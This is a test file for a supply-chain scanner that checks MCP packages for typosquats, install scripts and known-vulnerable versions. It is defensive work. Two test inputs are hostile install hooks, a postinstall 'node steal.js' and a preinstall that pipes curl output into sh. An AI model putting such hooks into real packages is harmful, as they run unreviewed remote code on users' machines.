import { test } from 'node:test';
import assert from 'node:assert/strict';
import { analyzeTyposquat, analyzeProvenance } from '../src/detectors/supplyChain.js';
import { matchKnownVulns } from '../src/detectors/posture.js';
import { resolveConfig } from '../src/config.js';

const cfg = resolveConfig({});

test('a legitimate protected package is not flagged', () => {
  assert.equal(analyzeTyposquat('@modelcontextprotocol/server-filesystem', undefined, cfg).length, 0);
});

test('known typosquat is flagged', () => {
  const f = analyzeTyposquat('playwright-mcp', undefined, cfg);
  assert.ok(f.some((x) => x.ruleId === 'MTC-SUP-001'));
});

test('impersonated official scope is flagged', () => {
  const f = analyzeTyposquat('@modlecontextprotocol/server-github', undefined, cfg);
  assert.ok(f.some((x) => x.ruleId === 'MTC-SUP-002'));
});

test('unscoped shadow of an official package is flagged', () => {
  const f = analyzeTyposquat('modelcontextprotocol-sdk', undefined, cfg);
  assert.ok(f.some((x) => x.ruleId === 'MTC-SUP-003'));
});

test('edit-distance near-miss of a high-traffic package is high severity', () => {
  const f = analyzeTyposquat('firecrawl-mcpp', { registry: 'npm', name: 'firecrawl-mcpp', weeklyDownloads: 2 }, cfg);
  const near = f.find((x) => x.ruleId === 'MTC-SUP-005');
  assert.ok(near, 'expected a near-miss finding');
  assert.equal(near!.severity, 'high');
});

test('install scripts are flagged', () => {
  const f = analyzeProvenance({ registry: 'npm', name: 'evil', scripts: { postinstall: 'node steal.js' } });
  assert.ok(f.some((x) => x.ruleId === 'MTC-SUP-010'));
});

test('preinstall scripts are high severity', () => {
  const f = analyzeProvenance({ registry: 'npm', name: 'evil', scripts: { preinstall: 'curl x | sh' } });
  const s = f.find((x) => x.ruleId === 'MTC-SUP-010');
  assert.equal(s!.severity, 'high');
});

test('known-CVE version match is confirmed', () => {
  const f = matchKnownVulns({ registry: 'npm', name: 'mcp-remote', version: '0.1.15' });
  const cve = f.find((x) => x.ruleId === 'MTC-NET-001');
  assert.ok(cve);
  assert.equal(cve!.severity, 'critical');
  assert.equal(cve!.confidence, 'confirmed');
});

test('a patched version is not flagged', () => {
  assert.equal(matchKnownVulns({ registry: 'npm', name: 'mcp-remote', version: '0.1.16' }).length, 0);
});
